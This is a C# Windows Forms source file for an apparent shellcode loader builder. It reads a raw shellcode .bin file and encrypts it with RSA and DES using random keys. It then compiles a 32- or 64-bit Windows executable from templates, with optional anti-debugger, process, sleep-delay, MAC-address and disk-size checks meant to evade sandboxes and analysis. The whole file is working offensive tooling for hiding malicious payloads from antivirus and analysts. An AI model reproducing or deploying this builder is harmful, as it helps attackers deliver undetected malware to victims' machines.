using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.CSharp;

namespace ShellcodeLoader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public static string bobPrivateKey;
        public static string bobPublicKey;

        string ReadFile(string path)
        {
            StreamReader sr = new StreamReader(path);
            string text = sr.ReadToEnd();
            sr.Close();
            return text;
        }

        static string OpenFile()
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Binary Files (*.bin)|*.bin",
                RestoreDirectory = true
            };
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                FileStream fileStream = File.Open(openFileDialog.FileName, FileMode.OpenOrCreate, FileAccess.ReadWrite);
                BinaryReader binaryReader = new BinaryReader(fileStream);
                byte[] buf = binaryReader.ReadBytes(Convert.ToInt16(fileStream.Length));
                binaryReader.Close();
                fileStream.Close();
                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                rsa.FromXmlString(bobPublicKey);
                string orgText = Convert.ToBase64String(buf);

                byte[] orgData = Encoding.Default.GetBytes(orgText);
                byte[] encryptedData = null;
                ArrayList arrEncrypteToTxt = new ArrayList();
                if (orgData.Length > 117)
                {
                    encryptedData = encryptedDataMethod(rsa, orgData, arrEncrypteToTxt);
                }
                else
                {
                    encryptedData = rsa.Encrypt(orgData, false);
                }

                return Convert.ToBase64String(encryptedData);

            }
            return String.Empty;
        }

        private static byte[] encryptedDataMethod(RSACryptoServiceProvider rsa, byte[] orgData, ArrayList arrEncrypteToTxt)
        {
            byte[] encryptedData = null;

            try
            {
                string strEncrypteToTxt = "";
                byte[] temp = null;
                byte[] tempEncrypedData = null;
                if (orgData.Length > 117)
                {
                    temp = new byte[117];
                    for (int i = 0; i < 117; i++)
                    {
                        temp[i] = orgData[i];
                    }
                }
                else
                {
                    temp = orgData;
                }
                tempEncrypedData = rsa.Encrypt(temp, false);
                strEncrypteToTxt = Convert.ToBase64String(tempEncrypedData);
                arrEncrypteToTxt.Add(strEncrypteToTxt);

                if (orgData.Length > 117)
                {
                    int j = 0;
                    byte[] again = new byte[orgData.Length - 117];
                    for (int i = 117; i < orgData.Length; i++)
                    {
                        again[j] = orgData[i];
                        j++;
                    }
                    return encryptedDataMethod(rsa, again, arrEncrypteToTxt);
                }
                else
                {
                    encryptedData = new byte[arrEncrypteToTxt.Count * 128];
                    Byte[] btFromBase64 = null;
                    int k = 0;
                    foreach (string strArr in arrEncrypteToTxt)
                    {
                        btFromBase64 = Convert.FromBase64String(strArr);
                        btFromBase64.CopyTo(encryptedData, k * 128);
                        k++;
                    }

                }
            }
            catch (Exception ex)
            {
                throw new Exception(ex.Message);
            }
            return encryptedData;
        }
        public string Encrypt(string pToEncrypt, string key, string iv)
        {
            DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider();
            descryptoServiceProvider.Key = Encoding.ASCII.GetBytes(key);
            descryptoServiceProvider.IV = Encoding.ASCII.GetBytes(iv);
            byte[] bytes = Encoding.Default.GetBytes(pToEncrypt);
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, descryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);
            cryptoStream.Write(bytes, 0, bytes.Length);
            cryptoStream.FlushFinalBlock();
            StringBuilder stringBuilder = new StringBuilder();
            foreach (byte b in memoryStream.ToArray())
            {
                stringBuilder.AppendFormat("{0:X2}", b);
            }
            stringBuilder.ToString();
            return stringBuilder.ToString();
        }

        public string RandomText(int length)
        {
            string outputText = "";
            string charList = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            string[] charListArray = new string[charList.Length];
            for (int i = 0; i < charList.Length; i++)
            {
                charListArray[i] = charList.Substring(i, 1);
            }
            Random random = new Random();
            for (int i = 0; i < length; i++)
            {
                outputText += charListArray[random.Next(0, charListArray.Length - 1)];
            }
            return outputText;
        }

        public void CompileCode(int platform, string privateKey, string encryptData)
        {
            if (encryptData != "")
            {
                Dictionary<string, string> options = new Dictionary<string, string>
                {
                    { "CompilerVersion", "v4.0" }
                };
                CSharpCodeProvider provider = new CSharpCodeProvider(options);
                CompilerParameters parameters = new CompilerParameters();
                parameters.GenerateExecutable = true;
                parameters.GenerateInMemory = false;
                parameters.CompilerOptions = "-target:winexe";
                if (checkBox1.Checked)
                {
                    parameters.CompilerOptions += " -win32manifest:Resources\\app.manifest";
                }
                if (checkBox7.Checked)
                {
                    parameters.CompilerOptions += " -win32icon:Resources\\Icon.ico";
                }
                if (platform == 32)
                {
                    parameters.CompilerOptions += " -platform:x86";
                }
                else if (platform == 64)
                {
                    parameters.CompilerOptions += " -platform:x64";
                }
                string path = "shellcode" + platform + ".exe";
                parameters.OutputAssembly = path;
                parameters.ReferencedAssemblies.Add("System.dll");
                string sourceCode = "";
                string key = RandomText(8);
                Thread.Sleep(100);
                string iv = RandomText(8);
                encryptData = Encrypt(encryptData, key, iv);
                privateKey = Encrypt(privateKey, key, iv);
                if (radioButton1.Checked)
                {
                    sourceCode = ReadFile("Template\\General.tpl");
                    sourceCode = sourceCode.Replace("{{Decrypt_Key_Here}}", key);
                    sourceCode = sourceCode.Replace("{{Decrypt_IV_Here}}", iv);
                    sourceCode = sourceCode.Replace("{{PrivateKey_Here}}", privateKey);
                    sourceCode = sourceCode.Replace("{{EncryptData_Here}}", encryptData);
                }
                else
                {
                    sourceCode = ReadFile("Template\\Argument.tpl");
                    sourceCode = sourceCode.Replace("{{Decrypt_Key_Here}}", key);
                    sourceCode = sourceCode.Replace("{{Decrypt_IV_Here}}", iv);
                    using (StreamWriter sw = new StreamWriter("Output.txt"))
                    {
                        sw.WriteLine("Private Key:");
                        sw.WriteLine(privateKey);
                        sw.WriteLine("");
                        sw.WriteLine("Encrypt Data:");
                        sw.WriteLine(encryptData);
                        sw.WriteLine("");
                        sw.WriteLine("Usage: shellcode" + platform + ".exe \"Private Key\" \"Encrypt Data\"");
                        sw.Flush();
                        sw.Close();
                    }
                }

                if (checkBox2.Checked)
                {
                    sourceCode = sourceCode.Replace("{{CheckDebugger_Here}}", ReadFile("Template\\Debugger.tpl"));
                }
                else
                {
                    sourceCode = sourceCode.Replace("{{CheckDebugger_Here}}", "");
                }

                if (checkBox3.Checked)
                {
                    sourceCode = sourceCode.Replace("{{CheckProcessMethod_Here}}", ReadFile("Template\\ProcessMethod.tpl"));
                    sourceCode = sourceCode.Replace("{{CheckProcess_Here}}", ReadFile("Template\\Process.tpl"));
                }
                else
                {
                    sourceCode = sourceCode.Replace("{{CheckProcessMethod_Here}}", "");
                    sourceCode = sourceCode.Replace("{{CheckProcess_Here}}", "");
                }

                if (checkBox4.Checked)
                {
                    sourceCode = sourceCode.Replace("{{CheckDelayMethod_Here}}", ReadFile("Template\\DelayMethod.tpl"));
                    sourceCode = sourceCode.Replace("{{CheckDelay_Here}}", ReadFile("Template\\Delay.tpl"));
                }
                else
                {
                    sourceCode = sourceCode.Replace("{{CheckDelayMethod_Here}}", "");
                    sourceCode = sourceCode.Replace("{{CheckDelay_Here}}", "");
                }

                if (checkBox5.Checked)
                {
                    sourceCode = sourceCode.Replace("{{CheckMACMethod_Here}}", ReadFile("Template\\MACMethod.tpl"));
                    sourceCode = sourceCode.Replace("{{CheckMAC_Here}}", ReadFile("Template\\MAC.tpl"));
                }
                else
                {
                    sourceCode = sourceCode.Replace("{{CheckMACMethod_Here}}", "");
                    sourceCode = sourceCode.Replace("{{CheckMAC_Here}}", "");
                }

                if (checkBox6.Checked)
                {
                    sourceCode = sourceCode.Replace("{{CheckDiskMethod_Here}}", ReadFile("Template\\DiskMethod.tpl"));
                    sourceCode = sourceCode.Replace("{{CheckDisk_Here}}", ReadFile("Template\\Disk.tpl"));
                }
                else
                {
                    sourceCode = sourceCode.Replace("{{CheckDiskMethod_Here}}", "");
                    sourceCode = sourceCode.Replace("{{CheckDisk_Here}}", "");
                }

                CompilerResults cr = provider.CompileAssemblyFromSource(parameters, sourceCode);
                if (cr.Errors.Count > 0)
                {
                    MessageBox.Show("编译失败");
                }
                else
                {
                    MessageBox.Show("编译成功");
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            bobPrivateKey = rsa.ToXmlString(true);
            bobPublicKey = rsa.ToXmlString(false);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            CompileCode(32, bobPrivateKey, OpenFile());
        }

        private void button2_Click(object sender, EventArgs e)
        {
            CompileCode(64, bobPrivateKey, OpenFile());
        }
    }
}
